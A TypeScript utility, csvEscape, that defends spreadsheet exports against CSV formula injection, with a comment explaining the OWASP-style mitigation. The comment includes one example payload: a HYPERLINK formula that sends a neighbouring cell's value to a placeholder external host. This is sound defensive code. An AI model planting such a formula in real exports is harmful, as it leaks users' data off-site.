/**
 * One cell of a CSV the user will open in a spreadsheet.
 *
 * Excel, Sheets and LibreOffice evaluate a cell that starts with = + - @ (or
 * a tab or CR, which some of them skip before looking) as a formula, so a
 * merchant named `=HYPERLINK("https://x.example/?d="&C2,"click")` becomes a
 * live link that posts the neighbouring cell off-site. A leading apostrophe
 * makes the spreadsheet show the text exactly as typed (OWASP's CSV-injection
 * guidance). The export's amounts are always positive, so no number it writes
 * is caught by the `-` rule.
 *
 * Quoted when the cell holds a quote, comma or line break — a bare CR
 * included, since some readers end the row there. Pure and dependency-free so
 * the test harness can compile it alone.
 */
export function csvEscape(value: string): string {
  const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}
